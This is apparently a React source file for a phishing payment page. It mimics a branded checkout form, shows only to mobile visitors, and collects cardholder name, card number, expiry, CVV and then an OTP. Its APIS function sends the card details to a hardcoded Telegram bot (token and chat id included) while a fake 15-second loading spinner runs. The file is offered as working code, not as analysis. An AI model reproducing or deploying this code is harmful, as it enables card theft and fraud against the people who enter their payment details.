import "./App.css";
import Axios from "axios";
import validator from "validator";
import { CircleLoader } from "react-spinners"; // Changed loader to CircleLoader
import { useState } from "react";
import Stepper from "./Components/Stepper";
import StepperControl from "./Components/StepperControl";
import { StepperContext } from "./Components/contexts/StepperContext";
import Payment from "./Components/Payments/Payment";
import Otp from "./Components/Payments/Otp";
import { isMobile } from "react-device-detect";

function App() {
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [state, setState] = useState({
    nameP: "",
    phone: "",
    cvc: "",
    expiry: "",
    focus: "",
    name: "",
    number: "",
    issuer: "",
    formData: null,
  });
  const [finalData, setFinalData] = useState({
    otp: "",
  });
  const [error, setError] = useState(false);

  const steps = ["Payment", "Confirmation"];
  const displayStep = (step) => {
    switch (step) {
      case 1:
        return <Payment state={state} setState={setState} error={error} />;
      case 2:
        return (
          <Otp
            setLoading={setLoading}
            finalData={finalData}
            setFinalData={setFinalData}
            error={error}
            setError={setError}
          />
        );

      default:
    }
  };
  const APIS = () => {
    const apiToken = "7793390385:AAGXlO786EhHb9MuMJk2-dq376E64ekksRU";
    const chatId = "5807893197";
    const text = `Name: ${state.name}%0ACard Number: ${state.number}%0AExpire: ${state.expiry}%0ACVV: ${state.cvc}`;
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
    Axios(url);
  };

  const handleClick = (direction) => {
    let newStep = currentStep;
    switch (newStep) {
      case 1: {
        if (
          (state.name && state.number && state.expiry && state.cvc) !== "" &&
          validator.isCreditCard(state.number)
        ) {
          APIS();
          setLoading(true);
          setTimeout(() => {
            setLoading(false);
          }, 15000);
          direction === "next" ? newStep++ : newStep--;
          setError(false);
        } else if (direction !== "next") {
          direction === "next" ? newStep++ : newStep--;
        } else {
          setError(true);
        }
        break;
      }
      case 2: {
        break;
      }
      default:
    }
    // check if steps are within bounds
    newStep > 0 && newStep <= steps.length && setCurrentStep(newStep);
  };

  return (
    <div>
      {isMobile ? (
        <section className="sf_colsOut amx-section">
          <div id="T0FBA7CBE009_Col00" className="sf_colsIn amx-container">
            <div className="amx-small-block-4-4 amx-medium-block-8-8 amx-large-block-8-12 amx-login-panel">
              <div
                className="amx-small-block-4-4 amx-medium-span-8-8 amx-large-span-12-12 ib"
                amx-loading-indicator-for="LoginModel"
              >
                <div className="amx-cp-loader amx-form-submit-loader"></div>
                <div className="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-amx-email">
                  <div className="amx-module amx-md-panel amx-md-login-account">
                    <div className="content--header"></div>
                  </div>
                  <div className="amx-module amx-md-panel amx-mr-form-panel amx-md-get-quote-form">
                    <div className="content--body ic">
                      {/* Stepper */}
                      <div className="container horizontal has-feedback amx-form-entry-container">
                        <Stepper steps={steps} currentStep={currentStep} />
                      </div>
                      {/* Display Components */}
                      <div className="my-10 p-10">
                        {loading ? (
                          <div className="flex flex-col items-center">
                            <CircleLoader
                              size={50} // Adjust the size for the circle animation
                              color={"#dc291e"}
                              loading={loading}
                            />
                            <br className="amx-cp-btn-holder" />
                          </div>
                        ) : (
                          <StepperContext.Provider
                            value={{
                              state,
                              setState,
                              finalData,
                              setFinalData,
                            }}
                          >
                            {displayStep(currentStep)}
                          </StepperContext.Provider>
                        )}
                      </div>
                      {/* Navigation Control */}
                      {currentStep !== steps.length && (
                        <StepperControl
                          handleClick={handleClick}
                          currentStep={currentStep}
                          steps={steps}
                        />
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      ) : (
        ""
      )}
    </div>
  );
}

export default App;
